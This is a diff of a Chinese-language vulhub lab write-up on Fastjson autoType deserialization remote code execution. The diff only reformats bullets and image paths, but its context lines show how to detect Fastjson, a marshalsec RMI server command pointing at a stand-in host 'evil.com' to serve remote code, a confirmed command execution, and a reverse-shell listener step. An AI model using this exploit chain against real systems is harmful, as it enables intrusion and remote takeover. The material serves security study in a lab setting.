@@ -6,8 +6,8 @@ Fastjson 在解析 json 的过程中，支持使用 autoType 来实例化某一�
 
 参考资料：
 
-- https://www.freebuf.com/vuls/208339.html
-- [http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/](http://xxlegend.com/2017/04/29/title- fastjson 远程反序列化 poc 的构造和分析/)
+* https://www.freebuf.com/vuls/208339.html
+* \[http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/]\(http://xxlegend.com/2017/04/29/title- fastjson 远程反序列化 poc 的构造和分析/)
 
 ## 环境搭建
 
@@ -19,7 +19,7 @@ docker-compose up -d
 
 环境运行后，访问 `http://your-ip:8090` 即可看到 JSON 格式的输出。
 
-![image-20220223111249998](images/202202231112044.png)
+![image-20220223111249998](../.gitbook/assets/202202231112044.png)
 
 我们向这个地址 POST 一个 JSON 对象，即可更新服务端的信息：
 
@@ -29,17 +29,17 @@ curl http://your-ip:8090/ -H "Content-Type: application/json" --data '{"name":"h
 
 ## 如何判断一个站点是否存在 Fastjson？
 
-- 参考阅读：https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/
+* 参考阅读：https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/
 
 **方式 1 响应时间**
 
 正常数据响应时间（29 毫秒）：
 
-![image-20220223141118979](images/202202231411062.png)
+![image-20220223141118979](../.gitbook/assets/202202231411062.png)
 
 存在 Fastjson 时，16 进制数据响应时间明显变长（396 毫秒）：
 
-![image-20220223140820884](images/202202231408972.png)
+![image-20220223140820884](../.gitbook/assets/202202231408972.png)
 
 **方式 2 DNSlog**
 
@@ -95,7 +95,7 @@ $ cp ./target/marshalsec-0.0.3-SNAPSHOT-all.jar /home/kali/vulnerability/vulhub/
 $ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://evil.com:8888/#TouchFile" 9999
 ```
 
-![image-20220223122416137](images/202202231224191.png)
+![image-20220223122416137](../.gitbook/assets/202202231224191.png)
 
 向靶场服务器发送 Payload，带上 RMI 的地址，注意 Content-Type 应该是 `application/json`：
 
@@ -119,11 +119,11 @@ Content-Length: 160
 }
 ```
 
-![image-20220223122432463](images/202202231224531.png)
+![image-20220223122432463](../.gitbook/assets/202202231224531.png)
 
 可见，命令 `touch /tmp/success` 已成功执行：
 
-![image-20220223122451321](images/202202231224373.png)
+![image-20220223122451321](../.gitbook/assets/202202231224373.png)
 
 ### 反弹 shell
 
@@ -184,4 +184,4 @@ Content-Length: 165
 
 监听 9999 端口，接收反弹 shell：
 
-![image-20220223125747062](images/202202231257183.png)
+![image-20220223125747062](../.gitbook/assets/202202231257183.png)
